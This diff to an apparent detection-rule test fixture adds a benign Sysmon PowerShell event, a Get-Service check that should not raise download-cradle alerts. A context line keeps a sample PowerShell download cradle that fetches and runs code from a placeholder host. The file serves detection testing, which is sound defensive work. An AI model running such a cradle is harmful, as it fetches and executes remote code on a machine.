@@ -16,5 +16,20 @@
         "commandLine": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/test')\""
       }
     }
-  }
+  },
+  "benign_event": {
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "severityValue": "INFORMATION",
+        "eventID": 1
+      },
+      "eventdata": {
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "commandLine": "powershell.exe -Command \"Get-Service -Name wuauserv | Select-Object Status, DisplayName\""
+      }
+    }
+  },
+  "benign_rationale": "Administrative diagnostic commands checking service health must not trigger download cradle alerts."
 }
